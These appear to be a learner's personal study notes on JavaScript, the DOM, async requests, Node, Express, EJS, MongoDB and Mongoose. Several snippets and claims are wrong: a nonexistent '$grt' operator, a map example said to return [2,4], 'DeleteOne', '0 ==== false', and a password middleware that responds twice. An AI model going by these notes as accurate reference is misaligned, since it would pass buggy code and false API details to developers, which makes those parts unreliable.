

### 5 basic primitive types

- Number
- String
- Boolean
- Null -> **intentional lack of value**, explicitly specified
- Undefined -> variables **not assigned any value** are undefined,
            or when there is no possible result

#### Some methods on string

- s.trim() remove whitespaces around
- s.toUpperCase()
- s.indexOf('ll') -> 2 if not found -1
- s.slice(begin_index, end_index) just like substr()
- s.replace('hello', 'namaste')

- 'top'.repeat(3) -> toptoptop

---

**Generate random number**

`Math.random()` -> 0 to 1

`Math.floor( Math.random() * 5) + 1` -> random number from 1 to 5



`==` -> check for equality of value, not equality of type

converts both value to same type then compares

`1 == '1'` -> true

`0 == false` -> true

`===` -> strict equality operator, equality of both value and type

`1 === '1'` -> false

`0 ==== false` -> false

**-----FALSE VALUES-----**

flase

0

""

null

undefined

NaN


`push()` -> add element in the end of array
```
let a = ['jfen','wef','wewef']
a.push('hey');  -> changes original array
output - ['jfen', 'wef', 'wewef', 'hey']
```

`pop()` -> remove last element from array and return that value
```
a.pop()
output - ['jfen', 'wef', 'wewef']
```

`shift()` -> remove from start
```
a.shift()
output - ['wef', 'wewef']
```

`unshift()` -> add element in the beginning
```
a.unshift('hey')
output - ['hey', 'wef', 'wewef']
```

let a=['a','b']
let b=['c','d']
let d=a.concat(b) ['a','b', 'c','d']

a.include('a') -> true

a.indexOf('b') -> 1 else -1

a.reverse() ->reverse the original array

a.slice(1) -> ['b'] creates a copy

SPLICE -> changes original array

a.splice(start, number of items to delete, values to insert)

a.splice(1, 0, 'c') -> ['a','c','b']
a.splice(0,1) -> ['c','b']

*/

/*

Object Literals

let a = {
    firstname : 'ritik',
    alast  : 'raj',
    number : 122,
    ids : ['1', '2']
    100: 'hundred'
}

all keys are converted to string, except symbols when we access using []

a['firstname'] -> correct
a.firstname -> correct

a[100] -> correct as key is coverted to strings

a.100 -> wrong

a.number = 90 -> modifies the object


---------------- For Loops

for(let i=0;i<=10;i++){
    console.log(i);
}

for - of loop

let subjects=['a','b','v']

for(let sub of subjects){
    console.log(sub)
}

______________ for each

let nums = [1,2,3,4];

function multi(num){
    console.log(num*10)
}

nums.forEach(multi);
or
nums.forEach(function (el) {
    console.log(el*10)
})

_____________ map

let even = nums.map((el) => {
    if(el%2==0)
    {
        return el;
    }
})

console.log(even) => [2,4]


*/

/*

------------------ Functions

function fun(){
    console.log('funny function);
}

fun() -> calls the function

_____________ function expression

const add = function (x,y){
    return x+y;
}

add(1, 2);


___________ arrow function

const sum = (x,y ) => {
    return x+y;
}

____arrow function implicit return 

when a function is just returning

const sum = (x,y) => (x+y);

or

const sum = (x,y) => x+y;


*/

/*

------------- SET TIMEOUT -------------


setTimeout(() => {
    console.log("hello")
},  3000);

output -> prints 'hello' after 3 seconds

-------------- SET INTERVAL -------------

repeat something in a fixed interval

setInterval(() => {
    console.log('hello')
}, 2000);

output => prints 'hello' after every 2 seconds

*/

/*

______________________DOM____________________

const h1 = document.querySelector('h1')
window.getComputedStyle(h1).color => will give color of h1

like this we can get all the style properties applied on h1

h1.classList.add('class-name')
h1.classList.remove('class-name')

h1.classList.toggle('class-name') removes and add

h1.classList.contains('class-name') checks if h1 has class-name

const par = h1.parentElement
const childr = h1.children

----------- creating elements using javascript

const img = document.createElement('img')
img.src = path to image

now we need to add this elelemnt to html
or after any elements in html

body.appendChild(img) -> will add this img element as body's child

body.append('some text') ->add text at the end of body
- we cant add this text using appendChild.

------ removeChild and remove (use this)

to remove an element we need its parent
<li>
    <p>we brwef </p>
</li>

remove p tag
const p = document.querySelector('p')
document.querySelector('li').removeChild(p)

using remove we can directly apply it on the element that needs to be removed
 
p.remove()

_______________________________DOM EVENTS_________________

-- inline events

<button onclick="alert('error'); prompt('enter value')">submit</button>

-- using js

const btn = document.querySelector('button')
btn.onclick = function () {
    console.log('clicked')
}

-- btn.onmouseenter = () {console.log('touched')}


----------------- Event Listeners ----------------

-- click
-- mouseup
and more

btn.addEventListener('click', function () {
    console.log('clicked')
})

----------------- keyboard events

on input

-- input -> fired whenever input changes
-- keydo
-- keyup

_______________ form

<form action="./page2/">
...
</form>

when we click on the button in form , by default it takes data to page2 and redirects there.

So to send the data to page2 but still remain on the current page is by using preventDefault()

const form = document.querySelector('form')
form.addEventListener('submit', function (e) {
    e.preventDefault();
})


--------- to prevent even bubbling
e.stopPropogation()

*/

/*
 ______________Promises_______________

const changeColor = (color, delay) =>{
    return new Promise((resolve, reject)=>{
        setTimeout(() => {
            document.querySelector('body').style.backgroundColor=color;
            resolve();
        }, delay);
    })
}

changeColor('violet', 1000)
    .then(() => changeColor('indigo', 1000))
    .then(() => changeColor('blue', 1000))
    .then(() => changeColor('green', 1000))
    .then(() => changeColor('yellow', 1000))
    .then(() => changeColor('orange', 1000))
    .then(() => changeColor('red', 1000))
    .then(() => changeColor('white', 1000))
    .catch((err) => console.log(err))

---- OR using async and await to process promises

async function rainbow() {
    await changeColor('violet', 1000);
    await changeColor('blue', 1000);
    await changeColor('green', 1000);
    await changeColor('yellow', 1000);
    await changeColor('orange', 1000);
    await changeColor('red', 1000);
    await changeColor('white', 1000);
}

rainbow();

and we can also use .then()
rainbow().then(() => console.log('end of rainbow'))

*/

/*

___________________AJAX_______________________

(Asynchronous Javascript and XML)

- a technique to create highly responsive web application
- uses javscript/html/css for displaying data and XMLHttpRequest (XHR) object to request data from server

XHR - is the original way of sending requests 
      via javascript
    - doesn't support promises 


-- allows web pages to update asynchronously 
-- we can update any part of page without reloading the entire page

eg. 
- on type search
- movie ratings


########## Now instead of XML , JSON is used

* Parsing a string containing json data

const data=`{"ticker":{"base":"btc","target":"usd","price":"13003"},"timestamp":"676768","success":true}`

* const dat = JSON.parse(data);

* JSON.stringify(dat) -> change to string like data

console.log(dat.ticker)


________________making request using XHR______


const req = new XMLHttpRequest();

// onload function is called when request is successfull

// onerror function is called when there is an error while making request

req.onload = function () {
    const data = JSON.parse(req.responseText)
    console.log(data)
}

req.onerror = () => console.log('error');

req.open("GET", "https://api.dictionaryapi.dev/api/v2/entries/en/hello")
req.send()

*/

/*
________________using Fetch to make request_________

- supports Promises


multiple request one after another, when first request
needs to be done before second

fetch("https://api.dictionaryapi.dev/api/v2/entries/en/hello") // -> return promise
    .then((res) => {
        console.log('resolved', res);
        return res.json();
    })
    .then((data) => {
        console.log(data)
        
        return fetch("https://api.dictionaryapi.dev/api/v2/entries/en/welcome")
    })
    .then((res) => {
        console.log('second request');
        return res.json();
    })
    .then((data) => console.log(data))
    .catch((err) => console.log(err));

    // OR

     
    // .then((res) => {
    //     console.log("resolved", res);

    //     // res.json() -> also returns promise
    //     res.json().then((data) => console.log(data));
    // })
    // .catch((err) => console.log(err));



--------- Making requests using (Async / Await) -------

const getWordsMeaning = async function() {
    try{
        const req = await fetch("https://api.dictionaryapi.dev/api/v2/entries/en/welcome");
        const data = await req.json();

        console.log(data);
    }
    catch(e) {
        console.log("error", e);
    }
}

getWordsMeaning();

___________________using Axios____________

- to make http request
- third party library
- easy and readable syntax 

how to use ?
- install using npm
or
- include the below script in your js file
<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

and that's it .

// code

axios.get("https://api.dictionaryapi.dev/api/v2/entries/en/welcome")
    .then((data) => {
        console.log(data); // no need to do data.json()
    })
    .catch((err) => console.log("error", err));

--------------- or

const getWordsMeaning = async function() {
    try{
        const data = await axios.get("https://api.dictionaryapi.dev/api/v2/entries/en/welcome");
        console.log(data);
    }
    catch(e) {
        console.log("error", e);
    }
}

getWordsMeaning();


------------ specifying headers with axios---------

const getWordsMeaning = async function() {
    
    const config = { headers: {Accept: 'something', some more header if needed } }
    const data = await axios.get("https://api.dictionaryapi.dev/api/v2/entries/en/welcome", config);
    console.log(data);
}

getWordsMeaning();

-------------- Adding gradients to borders --------------------

.input-wrapper:focus-within {
    border-width: 4px;
    border-style: solid;

    background: linear-gradient(white, white) padding-box,
        linear-gradient(to right, hsl(249, 99%, 64%), hsl(278, 94%, 30%)) border-box;
    border-radius: 8px;
    border: 1px solid transparent;
}


____________ Object Prototypes ________

Prototypes are the mechanism by which javascript objects inherit features from one another.

 Javascript is defined as -
 prototype-based-language

 to provide inheritance objects have a prototype object.

eg.
each array has reference to object __proto__
in which all the methodes like :
-push()
-include()
-pop() .. are defined.

Array.prototype -> will give list of all the methods defined in it.

We can even add our own methods to this prototype object, and this will be inherited by all those that use this prototype.

eg.
Array.protype.myMethod = ()=>{
    return "custom method";
}

now every array will have access to the method 'myMethod'

let v=[1,2,3];
console.log(v.myMethod) -> custom method


Array.prototype -> is an actual object
Array.__proto__ -> is a reference to this array we created.


________________ OOP_______________



----------constructor function----------

function Student(name,roll){
    this.name=name;
    this.roll=roll;
}

Student.prototype.display=function(){
    return `${this.name} ${this.roll}`;
}

const st=new Student("Ritik",48);
console.log(st.display());


_________class in js_____________

class Student {
    constructor(name,roll) {
        this.name=name;
        this.roll=roll;
    }
    display(){
        return `Name : ${this.name} Roll : ${this.roll}`;
    }
}

const s1 = new Student("Ritik",12);


------------ Inheritance in Javascript ---------

- extends => for inheriting from base class
- super => to call constructor of base class
           reference to class we are extending from.

eg.

class Animal
{
    constructor(name,age)
    {
        this.name=name;
        this.age=age;
    }
    eat()
    {
        return `${this.name} is eating.`;
    }
}

class Dog extends Animal
{
    barks()
    {
        return `${this.name} barks.`;
    }
}

class Cat extends Animal
{
    meow()
    {
        return `${this.name} meows.`;
    }
}

*/

/*

bash command - 
- touch sample.txt -> used to create files
- rmdir folder -> deletes empty folder 
- rm -rf -> deletes non-empty folders
- rm filename -> to delete file

________________ NodeJS _________________


It is a javascript runtime environment, that allows us to run javascript outside the browser.

Before we needed python, ruby for server side programming, but now node can used for this.
So with Javascript alone we can do both frontend and backend coding.

Used for :
- Creating Web servers
- Command line tool
- native app (like VSCode) using electronJs
- creating a game
- drone software
and many more.


REPL - Read Evaluate Print Loop -> like browser console where, as the code is written, ans is displayed.

.exit -> to exit from node

== node doesn't have access to all the 
   browser stuff's like window, document 
   and DOM API.

== Node comes with a bunch of builtin 
   modules that don't exist in the browser.
   Thses modules helps us to interact with 
   the operating system and file/folder etc.


Process
- this object is a global that provides information about, and control over the current NodeJs process.

process.cwd() -> gives the current directory in which we are running node

process.argv -> if run from the bash:
                - has one value that is the 
                path where node is installed.
                
             -> if run from the file then it
                has two values,   :   
               1st the path of node.
               2nd the path where this file is

using process.argv we can return the command line argument passed while running the file.

and it will be present from 2nd index in process.argv.

node main.js hello
- 'hello' will be at 2nd index in process.argv



___________ File System using Node __________

 module -> fs

 to use we do:
 const fs = require('fs');

 all file system operation can be done in both synchronous and asynchronous way.

---------------- create a folder:
- sync

const fs = require('fs');
fs.mkdirSync('hello');
console.log("folder created");



- async
const fs = require('fs');
fs.mkdir("new flder",(err)=>{
    console.log("will run after completeion");
    if(err) {
        console.log(err);
    }
})


-------------- creating files and writing

- sync
const fs = require('fs');
fs.writeFileSync('samplujhue.txt',"content");

-async
const fs = require('fs');
fs.writeFile('sample.txt',"content",(err)=>{
    if(err){
        console.log(err);
    }
})

____________ exporting from another file _____

file1.js

const add = (x,y) => x+y;
const square = x => x*x;


file2.js

to export the file1 we need require();

const f1 = require('./file1);
console.log(f1) ->{} gives empty object

when we require() any file then that file by default return object 'module.exports' whose value is {}

so to get the functions or anything defined in the file1, we need to add them to the module.exports

in file1--
const add = (x,y) => x+y;
const square = x => x*x;

module.exports.add=add;
module.exports.squar=square;

now this both will be accessible in file2

another way: --- using exports

exports.add=add;
exports.aquare=square;


-------------- requiring an entire directory

when we require an entire directory , then node looks for index.js file in that directory and whatever that index.js exports will be exported by that directory.

So index.js will require all the files in that directory and store them in an array, and that is what it will export.
Thus, exporting index.js, exports the complete directory.
--------------------
eg.
folder
    file-1
    file-2
    index.js

index.js
contents--

const f1=require('./file-1');
const f2=require('./file-2');

module.exports = [f1, f2];

--------------------


___________ NPM ______________

Node Package Manager
- a library where free packages are published by other developers
- a command line to install and manage the packages in our node project.

eg.
npm install give-me-a-joke -> inside folder which will use it

----- installing the package, creates a directory called 'node_modules' in which these package are installed.
with it another file 'package-lock.json is also created.


const jokes = require('give-me-a-joke);
jokes.getRandomDadJoke(function(joke){
    console.log(joke);
})

---- installing a package globally

npm install -g give-me-a-joke

if we want to use this globally installed package, we CANT USE REQUIRE();

instead in that folder run command : 
- npm link 'package-name'

----- package.json

every package we install has a file package.json
which contains information like 
- what this package is for
- its dependencies
- its version
and much more

when we create a node project then we will also create a package.json , and in that we will provide the required details regarding this node project.

command : npm init


---- installing dependencies of a project ----

get in the directory where the package.json is
then run : npm install

it will install all the dependencies provided in the package.json file.


______________ Express Js ______________

- framework for creating servers using node.

helps us to -
- start up a server to listen for requests
- parse incoming request
- craft our http response
and much more

---- code

const express = require("express");
const app = express();

// this function runs when we get an incoming request
app.use((req, res)=>{
    console.log("We got a new connection !!!")
})

// req -> (JS object) incoming request (is a http request in text format, but express converts it into object.)

// res -> outgoing response

app.listen(3000, ()=>{
    console.log("Listening on port 3000...");
})


res.send() -> to send the response.
we can send : texts, js object, html
res.send('hello');
or
res.send({name : "express"});
or res.send('<h1> title </h1>');

with one http request , we can only send one response.

---------- Routing ---------------

using the routes, we wont use app.use() as it is called on every request and at a time we can send only one response.

// making get requests

app.get('/home', (req,res)=>{
    res.send("Home page");
})

app.get('/about', (req,res)=>{
    res.send("About page");
})

---------- '*'

// it is going to match every route even though we haven't define them
So we can use this to display custom reponse when a user tries to request for a path that doesn't exists.

and we have to keep it after all the routes.
otherwise it will be executed for every requests.

app.get('*', (req,res)=>{
    res.send("i don't know this path")
})

-------- variable path routes...

// name is variable , and it's value is in req.params.


app.get('/home/:name',(req,res)=>{
    const { name }=req.params;
    res.send(`you are in home > ${name}`);
})


------------- query Strings
if we visit -> /search?q=images
to get 'images' we use -> req.query;

app.get('/search', (req, res)=>{
    const { q } = req.query;
    if(!q){
        res.send("nothing found");
    }
    res.send(`<h1>search for : ${q}`);
})


_____________________ EJS _______________

- Embedded Javascript
- simple templating language to generate html markup using javascript.

installing - npm i ejs

to make express use ejs : 
 - app.set('view engine','ejs'); -> using this we don't need to require     ('ejs') , it's automatically done by express.

Now by default when we use view engine, then express assumes our templates are in 'views' directory, and files in the directory may or may not end with .ejs.

now we can use the res object to send this html file.


app.get('/',(req,res)=>{
    res.render('home.ejs');  -> 'home.ejs' is present in views directory, and that's where 
})                                 express looks for it be default.

we can just write 'home' and it still work if we have set view engine to ejs.

'''
and the folder where we run the .js file from , in that same folder express looks for 'views' directory

so to run .js file from anywhere, we can change how 'views' directory is searched by express.

we can do : 

const path = require('path') -> provided by express
app.set('views', path.join(__dirname,'/views(any name)/')); __dirname -> where the this file is

********
--- to use static files like css, js, images in template -------

app.use(express.static('folder'))

in this folder we can have our css and js files amnd other images

and in template file we dont refer these static files as : /folder/main.css

instead - we directly refer to them 'main.css'

again this 'folder' is being looked in the directory where current file is , so to avoid this we can use 'path'

app.use(express.static(path.join(__dirname,'folder')))

********
'''

------------ EJS Tags ----------------

<%= ' javscript code ' %> -> 
- whatever code we write in this tag will execute
- we can even pass data from express to this template

<%= data %>
res.render('home.ejs',{data: "hello"});

---------- using conditionals and loops ---------

<% %> -> whatever is inside is not displayed , its 
        only to apply logics

<% if(i == 2) { %>
<h1> it is two </h1>
<% } %>

basically surround each line of js
with <% %>

the above snippet will show h1 tag only when the condition is met.

better way to write conditionals or loops is:
first write your javascript
ans then surround each line with <% %>


----------- partials / include ---------

this partials folder will also be inside views

tag : <%- include('partials/head') %> -> 

note : the path is relative from the caller who includes the file, not from the views directory set with app.set("views", "path/to/views").

- way of including templates in other templates

let's say there is a navbar that needs to be in every template, and navbar needs to be same .

then we can create a template in which we can add the html code of navbar.
let's say that file is navbar.ejs

then in whichever template we need that navbar we can write following syntax at the place where we want the navbar
 - <%- include('partials/navbar') %>
    partials -> folder which has navbar template




______________ get and post ________________

- get
    - used to retrieve information
    - Data is sent via query string
    - Information is plainly visible in the URL
    - Limited amount of data can be sent.

- post
    - used to post data to the server
    - used to write/create/update
    - Data is sent via request body, not a query string
    - Can send any sort of data (JSON)

- put
    - used to update (completely replaces with new one)
    - method replaces all current representations of the target 
      resource with the request payload.
- patch
    - used to apply partial modifications to a resource.
- delete
    - used to delete the specific resource


* forms in html supports only get and post request .
 so for patch, put, delete we use the following way:
  
 npm i method-override
 const methodOverride = require('method-override');
 app.use(methodOverride('_method'))-> '_method' can be named anyth.

 then in form, we will use method as post, but in action, we will append '?_method=PATCH' or '?_method=PUT', whichever we need.

 eg.
<form method="POST" action="/comments/<%=comment.id%>?_method=PATCH">
</form>

--------------- send post request 

app.post('/submit',(req,res)=>{
    res.send('post request');
})

--- extract data from post request body

req.body -> dcontains key value pairs of data submitted. By default it is undefined and is populated when we use body parsing middleware like:
    both are built in middleware functions
    - express.json() or express.urlencoded()
express.json() -> for parsing application/json
express.urlencoded() -> for parsing application/    
                            x-www-form-urlencoded


so we have to use:
- app.use(express.urlencoded({extended : true}))
parses incoming request with form data as payload

- app.use(express.json())
parses incoming request with json payload


________________ REST ________________

' REPRESENTATIONAL STATE TRANSFER '

- REST is an 'architectural style for distributed hypermedia system'.

- Its basically a set of guidelines of a client + server should communicate and perform CRUD operations on a given resource (any data on server-side).

RESTful -> system that complies with principles of REST.



AN EXAMPLE

USING COMMENTS AS A RESOURCE

Following is just one of the way of structuring application as restful.

// Implemented this in CrudApp

NAME    PATH                VERB    PURPOSE
Index   /comments           GET Display all comments
New     /comments/new       GET Form to create new comment
Create  /comments           POST Creates new comment on server
Show    /comments/:id       GET Details for one specific comment
Edit    /comments/:id/edit  GET Form to edit specific comment
Update  /comments/:id       PATCH Update specific comment on server
Destroy /comments/:id       DELETE Deletes specific item on server



_________________________ MONGODB _________________________

- NO SQL database
- document oriented database , like JSON
- No need to define schema
- gives flexibility in adding data



how to use :

run 'mongod' in cmd (its basically a mongo server)
then run 'mongosh' in cmd, so that it connects to the server.

- cls -> clears the screen
- ctrl C -> to exit
- show dbs -> shows all the databases
- use 'database_name' -> to create database


Mongodb uses BSON.

However, there are several issues that make JSON less than ideal for usage inside of a database.

1. JSON is a text-based format, and text parsing is very slow

2. JSON's readable format is far from space-efficient, another database concern

3. JSON only supports a limited number of basic data types

What is BSON? (Binary JSON)

BSON simply stands for "Binary JSON," and that's exactly what it was invented to be. BSON's binary structure
encodes type and length information, which allows it to be parsed much more quickly.

Since its initial formulation, BSON has been extended to add some optional non-JSON-native data types, like
dates and binary data, without which MongoDB would have been missing some valuable support.


JSON vs BSON

JSON
Encoding  - UTF-8 String
Data Support - String, Boolean, Number, Array
Readability - Human and Machine


BSON

Encoding  - Binary
Data Support - String, Boolean, Number (Integer, Float, Long,
Decimal 118...), Array, Date, Raw Binary
Readability - Machine Only

Collections  :
A collection is a grouping of MongoDB documents
A collection is the equivalent of a table in a relational database system. A collection exists within a single database.

show collections -> displays all the collections an a database.

------------- creating a collection -----------------

- Create

db.students.insert({name: "Ritik", class: 807});
so if the students, does not exist it will be created.

- Read

db.students.find() -> give all the document present in it.
                    it returns a cursor
db.students.findOne() -> returns the document

passing queries:
db.students.find({name: "Ritik"}) ->gives all document in which 
                                    name is Ritik

- Update

- $set ->operator replaces the value of a field with specified value
        or adds the fiels if it does not exist.

- $currentDate -> operator sets the value of a field to the current 
                  date, either as a Date or a timestamp.
                  The default type is Date.


.updateOne() -> updates only one
db.students.updateOne({name: "Ritik"}, {$set: {class: 900}});
changes the class of document in which name is Ritik, to class 900.

.updateMany() -> updates all that matches the query.

- Delete

db.students.DeleteOne({name: "Ritik"})
db.students.DeleteMany({}) -> deletes everything in this collection.

dogs collection ---------
{
    S "_id" : ObjectId("5f3dbbae6785b7cb67f49f09
    "name": "Dodger",
    "breed" : "Corgi",
    "age": 10,
    "weight": 31,
    "size": "M",
    "personality" : {
        "catFriendly" : true,
        "childFriendly" : true
    }
}
to get dogs whose personality is catfriendly:
- db.dogs.find({'personality.catFriendly': true})

more mongo operators:

- $grt ->  db.dogs.find({age : {$grt : 10}}) -> gives dogs with age 
                                                greater than 20.
- $lt -> less than
- $lte -> less than or equal to
- $in -> to find if something is present in specified in array
    db.dogs.find({breed : {$in: ['abc', 'def', 'ghr']}})

- $ans
- or 
db.dogs.find({$or: [{'personality.catFriendly': true}, {age: {$lte: 2}}]})
- gives documents , in wchich either catFriendly is true, or age is less than or equal to 2.


________________ Mongoose __________________
- is ODM -> for NO SQL

What is Mongoose? Mongoose is a Node. js-based Object Data Modeling (ODM) library for MongoDB

ODM (OBJECT DATA MAPPER)
(OBJECT DOCUMENT MAPPER)

ODMs like Mongoose map documents coming
from a database into usable JavaScript objects.

Mongoose provides ways for us to model out
our application data and define a schema. It
offers easy ways to validate data and build
complex queries from the comfort of JS.

ORM -> for SQL databases
Object Relational Mapper

conecting to mongodb ---------

const mongoose = require('mongoose');
mongoose.connect('mongodb://127.0.0.1:27017/test');
port: 27017
- mongoose returns a promise

// test is the database name
mongoose.connect('mongodb://127.0.0.1:27017/test')
    .then((data) =>{
        console.log("CONNECTION ESTABLISHED.")
    })
    .catch(err => {
        console.log("Error while connecting !!!");
    })



- Models

    Models are fancy constructors compiled from Schema definitions. An instance of a model is called a document. Models are responsible for creating and reading documents from the underlying MongoDB database.

* creating a schema

const movieschema = new mongoose.Schema({
    title: String,
    year: Number,
    rating: String,
    language: String
});


* creating a model

const Movie = mongoose.model('Movie', movieschema);

// 'Movie' inside .moedel() is used to create a collection 
//    and its name will be plural of 'Movie' -> 'movies'.

************* an instance of the model/ creating data ************** 

const movie1 = new Movie({title: 'Avengers', year: 2014,
                         rating: 9.5, language: 'English'})

movie1.save() // adds this to database movieApp

****************** getting the data *********************

Movie.find({}).then(data => console.log(data)); ->gives all data
Movie.find({rating: '9.5'}).then(data => console.log(data));
Movie.find({year: {$gte: 2015 }}).then(data => console.log(data));

.find() -> also takes second argument as callback 
.find({rating:'9.6'}, functin(err, doc)  {
    console.log(doc); -> doc is the data recieved
})

Movie.findOne({}).then(data => console.log(data)); ->gives one data

Movie.findById(id).then(data => console.log(data));

******************* updating ************************

- updates the rating of movie avenger.
Movie.updateOne({title: 'avenger'}, {rating: '9'}).then(res => console.log(res)); -> res just contains info about how many docs where updated


Movie.findOneAndUpdate({title: 'avenger'}, {rating: 7}, {new: true}).then(data => console.log(data));

gives back the new updated data. (new -> default is false)

********************* delete **********************

Movie.deleteOne({title: 'aveneger'}).then(data => console.log(data))
- gives back the number of docs deleted

- to delete and get back the item that was deleted use
.findOneAndDelete()


---------- Mongoose schema validation --------------

const movieschema = new mongoose.Schema({
    title: {
        type: String,
        required: true,
        default: "nothing",
        minlength: 5,
        maxlength: 20
    }
    year: Number,
    rating: {
        type: String,
        min: [5, 'cant be smaller than 5'] -> second one is err msg
    }
    language: {
        type: String,
        enum: ['En', 'Hi']; -> now the value of language has to 
    }                          from what is provided in enum.
});

there are many more schema validation options we can use.

Note: These validation that we applied, will only be considered while creating the data.

While updating the data these are not considered so we have to explicitly specify that we want to run validation on this.

Movie.updateOne({title: 'avenger'}, {rating: '9.8'}, {runValidators: true})


--- Adding Instance methods to the schema

 - Instances of Models are documents. Documents have many of their own built-in instance methods. We may also define our own custom document instance methods.

movieSchema.methods.display = function() {
    console.log(`movie is : ${this.title}`)

    - here this refers to instances of models.
}

now all the instances of the models of this schema will have access to it.

const Movie = mongoose.model('Movie', movieschema);

const movie1 = new Movie({title: 'Avengers', year: 2014,
                         rating: 9.5, language: 'English'})

movie1.display() -> movie is Avengers

----- Addidng static methods to models

movieSchema.statics.changeRatings = function() {
    return this.updateMany({}, {rating: 5});

    here this refers to the Model Movie , not its instance
}

Movie.changeRatings(data => {console.log(data)});

-------------------- Mongoose Middleware--------

- also called pre and post hooks
- these are functions which are executed during the certain operation.
like we execute some code just before saving and after saving.

- Middleware is specified on the schema level

eg.
movieSchema.pre('save', async function() {
    console.log("About to save");
})

movieSchema.post('save', async function() {
    console.log("Just Saved");
})

- Now whenever we save something then , 'About to save' will be printed, and when saving is done the 'Just Saved' will be printed.

___________ Express MIDDLEWARE _____________


Middleware functions are functions that have access to the request object(req), response object(res), and the next middleware function in the applications request-response cycle.



- Middleware can end the HTTP request by sending back a response with methods like res.send())
- OR middleware can be chained rogether, one after another by calling next()

the middleware we want express to use is specified in:
app.use() -> like express.urlencoded() is a middleware that we used to parse the form data. 
these middleware are called at each request, and then, they pass the control to the next middleware or just end the request response cycle.

eg. app.use(() =>{
    console.log('hiii')
})

 ->this will be called at each request but then will just hang there and won't move on to the next route we request , as we have not specifies what to do after using this middleware.


 but if we provide 'next' parameter to the function then it will automaticallly call the the next route that we request.

and if we send the response from the middleware itself, then this will end the cycle and then we won't need next.

eg. app.use((req, res, next) => {
    console.log("hii");
    next();
})


- we can also define middleware to run when a particular route is hit, we can do this by specifying the middleware in route itself.

Let's say we want to visit a route '/secret' only when a particular 'passowrd' query is sent.

like -> if password is '1234', then only /secret should be accessible

eg.

const secretCheck = (req, res, next) => {
    const {password} = req.query;

    if(password==='1234')
    {
        next();
    }
    res.send("AOOOOOH WRONG PASSWORD");
}

app.get('/tweets', secretCheck, (req, res) => {
    res.render('tweets/index', { tweets });
})

now , /tweets will only be given to us , when we access it by /tweets?password=1234

--------------- Handling Errors in Express --------------------

- Express comes with buil-in error handler that takes care of any errors that might be encountered in the app. This default error-handling middleware function is added at the end of the middleware function stack.

- default error-handler in express looks for err.status (or err.statusCode) by default express assigns is 500

- and the error message is the err.stack

================= Layouts 

- ejs-mate => ejs template engine

how to use : 

npm i ejs-mate

const ejsMate=require('ejs-mate');
app.engine('ejs', ejsMate);


now we will create a common html ejs file like boilerplate.ejs
e.g. 
        <!DOCTYPE html>
        <html lang="en">

        <head>
            <meta charset="UTF-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Boilerplate</title>
        </head>
        </head>

        <body class="d-flex flex-column vh-100">
            <%- include('../partials/navbar') %>
                <main class="container mt-3">
                    <%- body %>
                </main>
                <%- include('../partials/footer') %>
        </body>

        </html>

<%- body %> is where the other html codes will be injected

let's say 'edit.ejs' wants to use this templete then,

then above the html structure of edit.ejs, write 
<%- layout('boilerplate')


================== Custom error handler

- this middleware takes 4 arguments 

app.use((err, req, res, next) => {
     console.log("ERRRRRRRRRRRRRRRROR");
     next(err);
})

now when any error occurs , then the above middleware will be executed first, and in the error handling middleware we have to call next(err) with er, and this will call the built-in error-handling miidleware
 with err as body , rather than using next(err), send our custom response, res.send("ERROR");

- custom error class

class AppError extends Error {
    constructor(message, status) {
        super();
        this.message=message;
        this.status=status
    }
}

app.get('/error, (req,res) => {
    throw new AppError('Error route', 401);
})

app.use((err, req,res,next) => {
    const { status=500, message="Something went wrong"} = err;

    res.status(status).send(message);
})

------ handling async errors

Errors returned from asynchronous function invoked by route handlers and middleware, you must pass them to the next() function, then Express will catch and process it.

i.e, 

if we just throw the error, it won't trigger the error-handling miidleware we defined, so we have to call next with the any message, or with custom error.

app.get('/post/:id', async (req, res, next) => {
    const { id } = req.params;
    const s=await Posts.findById(id);

    if(!s) {
        return next(new AppError('not found', 404));
    }
    res.render('/show', { id });


    // we have to use return , as next doesn't stop the further execution so it will call res.render() and we will get error, therefore we return.
})


it's possible that other than not geeting post some other error might occur, so we can wrap the code with try-catch.

app.get('/post/:id', async (req, res, next) => {
    try {
        const { id } = req.params;
        const s=await Posts.findById(id);

        if(!s) {
            throw next(new AppError('not found', 404));
            // here we did throw, because we are catching the error.
        }
        res.render('/show', { id });
    }
    catch(e) {
        next(e);
    }
})

### instead of wrapping every async around try - catch, we can wrap the async function with another function, which will then catch the error.

function wrapAsync(fn) {
    return function (req, res, next) {
        fn(req, res, next).catch(e => next(e));
    }
}

app.get('/post/:id', wrapAsync(async (req, res, next) => {
    const { id } = req.params;
    const s=await Posts.findById(id);

    if(!s) {
        throw next(new AppError('not found', 404));
        // here we did throw, because we are catching the error.
    }
    res.render('/show', { id });
}));


-------------- Validations ---------------------

Basically even before we save data to databse, we will validate it if the data is in correct format.

* event though if we try to post something like in  YelpCamp without any content in input, it won't post as input validation style is on.
but someone can post via postman or making api request, and that is also the reason we must use validation on our data.

- Joi -> javascript package for schema validation
- npm i joi

const campgroundSchema = Joi.object({
    campground: Joi.object({
        title: Joi.string().required(),
        price: Joi.number().required().min(0),
        description: Joi.string().required(),
        image: Joi.string().required()
    }).required()
})

const result = campgroundSchema.validate(req.body);
console.log(result);

-> let's say we passed every info but title was not given and price was negative , then following will be stored in result

{
  value: {
    campground: {
      description: 'nice place yuiuiweru',
      location: 'earth wwetwet',
      image: 'wetwe we sample.image.http',
      price: '-9'
    }
  },
  error: [Error [ValidationError]: "campground.title" is required] {
    _original: { campground: [Object] },
    details: [ [Object] ]
  }
}

const { error } = campgroundSchema.validate(req.body);
if(error) {
    const msg = error.details.map(err => err.message).join(" ");
    throw new ExpressError(msg, 400);
}

-------------------- Mongo Relationships --------------------------

# one to few
- here we embed a document inside of another document

eg.
consider a User document.
const userSchema = new monggose.Schema(
{
    name: String,
    phone: Number,
    addresses: [
        {
            state: String,
            country: String,
            town: String,
            street: Number
        }
    ]
});

const User = mongoose.model('User',userSchema);
const u = new User({
    name: 'User A',
    phone: 123456,
})

u.addresses.push({
    state:'rge',
    country: 'rweg',
    town: 'rwgwg',
    street:56
});

Now, when we create this type of schema then mongooses consider each address also a document and so also assigns it an id.
to avoid the inner document having id, specify =>  _id: { id: false } in addresses

# one to many 
here the reference i.e id of another document is present instead of the related document actually present there (as in one to few)

1) one way to structure is storing reference of child document in parent element ( when the data is small (i.e less relationships) )

structure: 
{
    name: 'User a',
    phone: 34434344,
    addresses: [
        ObjectId("45fe645656756757g757cv"),
        ObjectId("45fe645656756757g757cv")
    ]
}

eg.

